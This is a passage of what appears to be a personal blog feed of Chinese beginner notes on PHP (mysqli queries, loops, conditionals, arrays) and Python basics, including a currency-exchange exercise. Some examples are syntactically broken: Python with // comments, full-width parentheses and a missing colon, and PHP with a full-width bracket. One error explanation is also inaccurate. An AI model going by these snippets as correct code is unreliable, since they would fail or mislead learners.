BY 关键词用于对记录集中的数据进行排序。</p><p>ORDER BY 关键词默认对记录进行升序排序。</p><p>如果你想降序排序，请使用 DESC 关键字。</p><p><strong>语法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column_name(s) ASC|DESC</span><br></pre></td></tr></table></figure><p>实例</p><p>选取 “Persons” 表中存储的所有数据，并根据 “Age” 列对结果进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; mysqli_query($con,&quot;SELECT * FROM Persons ORDER BY age&quot;);</span><br><span class="line"></span><br><span class="line">while($row &#x3D; mysqli_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    echo $row[&#39;FirstName&#39;];</span><br><span class="line">    echo &quot; &quot; . $row[&#39;LastName&#39;];</span><br><span class="line">    echo &quot; &quot; . $row[&#39;Age&#39;];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Glenn Quagmire 33</span><br><span class="line">Peter Griffin 35</span><br></pre></td></tr></table></figure><h6 id="根据两列进行排序"><a href="#根据两列进行排序" class="headerlink" title="根据两列进行排序"></a>根据两列进行排序</h6><p>当按照多个列进行排序时，只有第一列的值相同时才使用第二列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1, column2</span><br></pre></td></tr></table></figure><h5 id="修改数据库表中的数据。"><a href="#修改数据库表中的数据。" class="headerlink" title="修改数据库表中的数据。"></a>修改数据库表中的数据。</h5><h5 id="UPDATE-语句用于中修改数据库表中的数据。"><a href="#UPDATE-语句用于中修改数据库表中的数据。" class="headerlink" title="UPDATE 语句用于中修改数据库表中的数据。"></a>UPDATE 语句用于中修改数据库表中的数据。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1&#x3D;value, column2&#x3D;value2,...</span><br><span class="line">WHERE some_column&#x3D;some_value</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($con,&quot;UPDATE Persons SET Age&#x3D;36</span><br><span class="line">WHERE FirstName&#x3D;&#39;Peter&#39; AND LastName&#x3D;&#39;Griffin&#39;&quot;);</span><br><span class="line"></span><br><span class="line">mysqli_close($con);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;连接-MySQL&quot;&gt;&lt;a href=&quot;#连接-MySQL&quot; class=&quot;headerlink&quot; title=&quot;连接 MySQL&quot;&gt;&lt;/a&gt;连接 MySQL&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="PHP -数据库" scheme="http://example.com/tags/PHP-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>PHP语法5</title>
    <link href="http://example.com/2020/10/19/PHP%E8%AF%AD%E6%B3%956/"/>
    <id>http://example.com/2020/10/19/PHP%E8%AF%AD%E6%B3%956/</id>
    <published>2020-10-18T19:04:51.000Z</published>
    <updated>2020-10-18T11:45:17.122Z</updated>
    
    <content type="html"><![CDATA[<h5 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h5><table><thead><tr><th>—LINE—</th><th>文件中的当前行号。</th><th><strong>CLASS</strong></th><th>常量返回该类被定义时的名字（区分大小写）。</th></tr></thead><tbody><tr><td><strong>FILE</strong></td><td>文件的完整路径和文件名。</td><td>Trait</td><td>代码复用的方法</td></tr><tr><td><strong>DIR</strong></td><td>文件所在的目录</td><td><strong>METHOD</strong></td><td>返回该方法被定义时的名字</td></tr><tr><td><strong>FUNCTION</strong></td><td>返回该函数被定义时的名字（区分大小写）</td><td><strong>NAMESPACE</strong></td><td>当前命名空间的名称（区分大小写）。（namespace）</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;魔术常量&quot;&gt;&lt;a href=&quot;#魔术常量&quot; class=&quot;headerlink&quot; title=&quot;魔术常量&quot;&gt;&lt;/a&gt;魔术常量&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;—LINE—&lt;/th&gt;
&lt;th&gt;文件中的当前行号。&lt;/th&gt;
&lt;th&gt;&lt;stro</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>PHP语法学习4</title>
    <link href="http://example.com/2020/10/15/PHP%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A04/"/>
    <id>http://example.com/2020/10/15/PHP%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A04/</id>
    <published>2020-10-14T21:37:49.000Z</published>
    <updated>2020-10-14T13:51:47.100Z</updated>
    
    <content type="html"><![CDATA[<h4 id="PHP循环"><a href="#PHP循环" class="headerlink" title="PHP循环"></a>PHP循环</h4><ul><li><p><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</p></li><li><p><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</p></li><li><p><strong>for</strong> - 循环执行代码块指定的次数</p></li><li><p><strong>foreach</strong> - 根据数组中每个元素来循环代码块</p><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><ul><li><h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6></li></ul><p>while 循环将重复执行代码块，直到指定的条件不成立。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>or</p><p>do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">while (条件);</span><br></pre></td></tr></table></figure><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for 循环用于您预先知道脚本需要运行的次数的情况。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><strong>初始值</strong>：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</li><li><strong>条件</strong>：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。</li><li><strong>增量</strong>：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</li></ul><p><strong>注释：</strong>上面的<strong>初始值</strong>和<strong>增量</strong>参数可为空，或者有多个表达式（用逗号分隔）。</p><h5 id="foreach循环"><a href="#foreach循环" class="headerlink" title="foreach循环"></a>foreach循环</h5><p>foreach 循环用于遍历数组。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;PHP循环&quot;&gt;&lt;a href=&quot;#PHP循环&quot; class=&quot;headerlink&quot; title=&quot;PHP循环&quot;&gt;&lt;/a&gt;PHP循环&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;while&lt;/strong&gt; - 只要指定的条件成立，则循环执行代码块&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="php 循环语句" scheme="http://example.com/tags/php-%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python学习1</title>
    <link href="http://example.com/2020/10/12/Python%E5%AD%A6%E4%B9%A01/"/>
    <id>http://example.com/2020/10/12/Python%E5%AD%A6%E4%B9%A01/</id>
    <published>2020-10-11T21:02:05.000Z</published>
    <updated>2020-10-11T13:49:37.345Z</updated>
    
    <content type="html"><![CDATA[<h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>最近除了学习PHP语法外，还接触了部分Python。</p><p>个人觉得比起C语言和PHP，Python更加简洁，也更容易入手，非常适合新手。</p><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><h5 id="输出语句"><a href="#输出语句" class="headerlink" title="输出语句"></a>输出语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print（   ）</span><br></pre></td></tr></table></figure><h5 id="转换数据类型语句"><a href="#转换数据类型语句" class="headerlink" title="转换数据类型语句"></a>转换数据类型语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">float（   ）&#x2F;&#x2F;将括号内的内容转换为浮点型。</span><br><span class="line">str(    )&#x2F;&#x2F;将括号内的内容转换为字符串。</span><br><span class="line">int（   ）&#x2F;&#x2F;将括号内的内容转换为整数。</span><br></pre></td></tr></table></figure><p>数据之间用+连接，只有相同类型的数据之间才可以连接。</p><p>for example：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print（1+1）&#x2F;&#x2F;将输出2</span><br><span class="line">print(1+&quot;1&quot;)&#x2F;&#x2F;失败</span><br><span class="line">print（&quot;1&quot;+&quot;1&quot;)&#x2F;&#x2F;将输出11</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if      else&#x2F;&#x2F;用于两个判断</span><br><span class="line">if    elif   else&#x2F;&#x2F;在两个判断的基础上新增一个判断</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;3</span><br><span class="line">if a&gt;&#x3D;2:</span><br><span class="line">  print(a)</span><br><span class="line">else:</span><br><span class="line">  print(a+1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意！！！！</p><p>这里的if与else首字母需对齐，print与print首字母也需对齐。</p><p>同样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;3</span><br><span class="line">if a&gt;&#x3D;2:</span><br><span class="line">  print(a)</span><br><span class="line">elif a&gt;&#x3D;10</span><br><span class="line">  print(a+7)</span><br><span class="line">else:</span><br><span class="line">  print(a+1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="还有if嵌套"><a href="#还有if嵌套" class="headerlink" title="还有if嵌套"></a>还有if嵌套</h6><p>举个例子、、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D;26</span><br><span class="line">if a&gt;&#x3D;60:</span><br><span class="line">    print(&quot;你已经及格&quot;)</span><br><span class="line">    if a&gt;&#x3D;80:</span><br><span class="line">        print(&quot;你很优秀&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;你只是一般&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;不及格&quot;)</span><br><span class="line">    if 30&lt;&#x3D;a&lt;&#x3D;60:</span><br><span class="line">        print(&quot;你还可以再抢救一下&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;学渣&quot;)</span><br><span class="line"> </span><br><span class="line">print(&quot;程序结束&quot;)</span><br></pre></td></tr></table></figure><p>同样的</p><p>同级的if与else对齐，执行命令的语句对齐。</p><h5 id="input（）语句"><a href="#input（）语句" class="headerlink" title="input（）语句"></a>input（）语句</h5><p>input()函数是输入函数，当你在函数的括号内写出问题时，input()函数会将此问题原样显示在屏幕上，并在终端区域等待你针对此问题的回答。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input（&quot;请选择A,B,C,D&quot;)&#x2F;&#x2F;屏幕上会出现  请选择A,B,C,D  的语句。</span><br></pre></td></tr></table></figure><p>input会对输入的答案进行储存，如果需要把答案提取出来，需将input（）赋值给一个变量，并将变量输出。</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input(&quot;请在以下四个选项【A,B,C,D】中，输入你的答案:&quot;)</span><br><span class="line">name &#x3D; input(&quot;请输入你的答案：&quot;)</span><br><span class="line"></span><br><span class="line">print (name)</span><br></pre></td></tr></table></figure><h5 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h5><p>分享一下自己做的一个综合性练习</p><table><thead><tr><th>题目要求</th><th>提示</th></tr></thead><tbody><tr><td><strong>注意：以下背景与题目要求相关</strong> 小精灵：您好，欢迎来到古灵阁，请问您需要帮助吗？需要or不需要？ 你：需要 小精灵：请问您需要什么帮助呢？1 存取款；2 货币兑换；3 咨询 你：2 小精灵：金加隆和人民币的兑换率为1:51.3，即一金加隆=51.3人民币 小精灵：请问您需要兑换多少金加隆呢？ （你说了一个数字N） 小精灵：好的，我知道了，您需要兑换（你说的数字N）金加隆。 小精灵：那么，您需要付给我（你说的数字N*51.3）人民币。</td><td>和小精灵的对话可以被这么拆分：<br/>1.小精灵通过input()函数进行提问。<br/>2.提问分为两个基础条件：基础条件1<code>if</code>需要帮助；基础条件2<code>else</code>不需要帮助。<br/>3.在<strong>基础条件1</strong>需要帮助的情况下，又分为3个额外条件：<code>if</code>1存取款；<code>elif</code>2货币兑换；<code>else</code>3咨询。<br/>4.小精灵会根据你的选择，给予不同的回答。如果选择1-存取款或者3-咨询，小精灵会推荐你去对应的窗口。<br/>5.如果选择<code>elif</code>条件2-货币兑换，需要再通过input()函数提一个问题：<strong>请问您需要兑换多少金加隆呢？</strong><br/>6.当获得了回答后，由于1金加隆=51.3人民币，而你支付的是人民币，所以需要计算出支付的人民币数额。<br/>7.这时，你需要使用<code>float()</code>函数，将回答的数额转换为<strong>浮点类型</strong>进行计算，再通过<code>str()</code>函数，转换为<strong>字符串类型</strong>才能进行数据拼接，打印出小精灵说的话<strong>那么，您需要付给我（你说的数字N*51.3）人民币。</strong><br/>8.在<strong>基础条件2</strong>不需要帮助的情况下，小精灵会礼貌的说再见。</td></tr></tbody></table><p>接下来是我对该练习的解答</p><p>运行成功，但不知道是否正确，权当参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;input(&quot;您好，欢迎来到古灵阁，请问您需要帮助吗？需要or不需要？&quot;)</span><br><span class="line">if a&#x3D;&#x3D;&quot;需要&quot;:</span><br><span class="line">    b&#x3D;input(&quot;小精灵：请问您需要什么帮助呢？1 存取款；2 货币兑换；3 咨询&quot;)</span><br><span class="line">    if b&#x3D;&#x3D;&quot;1&quot;:</span><br><span class="line">        print(&quot;小精灵推荐你去存取款窗口&quot;)</span><br><span class="line">    elif b&#x3D;&#x3D;&quot;2&quot;:</span><br><span class="line">        print(&quot;小精灵：金加隆和人民币的兑换率为1:51.3，即一金加隆&#x3D;51.3人民币&quot;)</span><br><span class="line">        N&#x3D;input(&quot;小精灵：请问您需要兑换多少金加隆呢？&quot;)</span><br><span class="line">        print(&quot;小精灵：好的，我知道了，您需要兑换&quot;+N+&quot;金加隆。&quot;)</span><br><span class="line">        N&#x3D;float(N)</span><br><span class="line">        k&#x3D;str(N*51.3)</span><br><span class="line">        print(&quot;小精灵：那么，您需要付给我&quot;+k+&quot;人民币&quot;)</span><br><span class="line">    else:</span><br><span class="line">              print(&quot;小精灵推荐你去咨询窗口。&quot;)</span><br><span class="line">else:</span><br><span class="line">     print(&quot;小精灵:好的，再见。&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h6&gt;&lt;p&gt;最近除了学习PHP语法外，还接触了部分Python。&lt;/p&gt;
&lt;p&gt;个人觉得比起C语言和PHP，Python更加简洁，也更容易入手，非常适合</summary>
      
    
    
    
    
    <category term="-python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>PHP 学习3</title>
    <link href="http://example.com/2020/10/12/PHP-%E5%AD%A6%E4%B9%A03/"/>
    <id>http://example.com/2020/10/12/PHP-%E5%AD%A6%E4%B9%A03/</id>
    <published>2020-10-11T18:59:31.000Z</published>
    <updated>2020-10-14T13:34:28.666Z</updated>
    
    <content type="html"><![CDATA[<h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>由于if，，else；elseif的用法与Python很像，就简单举个例子加强记忆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$t&#x3D;date(&quot;H&quot;); </span><br><span class="line">if ($t&lt;&quot;10&quot;) </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;Have a good morning!&quot;; </span><br><span class="line">&#125; </span><br><span class="line">elseif ($t&lt;&quot;20&quot;) </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;Have a good day!&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;Have a good night!&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><h5 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">switch（n）&#x2F;&#x2F;n为变量</span><br><span class="line">&#123;</span><br><span class="line">case &#x2F;&#x2F;条件1:</span><br><span class="line">       &#x2F;&#x2F;执行命令</span><br><span class="line">       break</span><br><span class="line">case&#x2F;&#x2F;条件2：</span><br><span class="line">       &#x2F;&#x2F;执行命令</span><br><span class="line">       break</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">case&#x2F;&#x2F;条件n:</span><br><span class="line">       &#x2F;&#x2F;执行命令</span><br><span class="line">       break</span><br><span class="line">       </span><br><span class="line">default:</span><br><span class="line">          &#x2F;&#x2F;上述条件都不符合时执行的命令</span><br><span class="line">          &#125;</span><br><span class="line">       &#x2F;&#x2F;记得case语句后的冒号&#x2F;&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>顺便一提，刚刚写了一个代码，结果一直无法运行，终于发现了原因</p><p>错误代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;35;</span><br><span class="line">if ($a&lt;&quot;30&quot;）</span><br><span class="line">&#123;</span><br><span class="line">echo (&quot;a小于30&quot;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (&quot;30&quot;&lt;&#x3D;$a&lt;&#x3D;&quot;70&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">echo &quot;a在三十到七十间&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    &#123;</span><br><span class="line">echo &quot;a大于七十&quot;;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>错误原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elseif (&quot;30&quot;&lt;&#x3D;$a&lt;&#x3D;&quot;70&quot;)</span><br><span class="line">&#x2F;&#x2F;语句错误，$a无法连续赋值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;35;</span><br><span class="line">if ($a&lt;&quot;30&quot;）</span><br><span class="line">&#123;</span><br><span class="line">echo (&quot;a小于30&quot;);</span><br><span class="line">&#125;</span><br><span class="line">elseif ($a&gt;&#x3D;&quot;70&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">echo &quot;a大于70&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    &#123;</span><br><span class="line">echo &quot;a在三十到七十间&quot;;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h5><table><thead><tr><th><strong>数值数组</strong></th><th>带有数字 ID 键的数组</th></tr></thead><tbody><tr><td><strong>关联数组</strong></td><td>带有指定的键的数组，每个键关联一个值</td></tr><tr><td><strong>多维数组</strong></td><td>包含一个或多个数组的数组</td></tr><tr><td></td><td></td></tr></tbody></table><h5 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array();</span><br></pre></td></tr></table></figure><p>for  example</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><h5 id="获取数组长度（元素个数）"><a href="#获取数组长度（元素个数）" class="headerlink" title="获取数组长度（元素个数）"></a>获取数组长度（元素个数）</h5><p>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">echo count($cars);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><h5 id="遍历并打印数值数组中的所有值"><a href="#遍历并打印数值数组中的所有值" class="headerlink" title="遍历并打印数值数组中的所有值"></a>遍历并打印数值数组中的所有值</h5><hr><p>for()循环函数+  x++  运算符的运用</p><hr><p>for example</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">$arrlength&#x3D;count($cars);</span><br><span class="line"> </span><br><span class="line">for($x&#x3D;0;$x&lt;$arrlength;$x++)</span><br><span class="line">&#123;</span><br><span class="line">    echo $cars[$x];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><p>关联数组是使用您分配给数组的指定的键的数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$n&#x3D;array( &quot;a&quot; &#x3D;&gt;&quot;b&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>eg </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);</span><br><span class="line">echo &quot;Peter is &quot; . $age[&#39;Peter&#39;] . &quot; years old.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>[^运行结果]: Peter is 35 years old.</p><h4 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h4><hr><p>使用 foreach()函数</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);</span><br><span class="line"> </span><br><span class="line">foreach($age as $x&#x3D;&gt;$x_value)&#x2F;&#x2F;$x和$x-value为变量名，可自定义</span><br></pre></td></tr></table></figure><h4 id="数组排序函数"><a href="#数组排序函数" class="headerlink" title="数组排序函数"></a>数组排序函数</h4><ul><li><p>sort() - 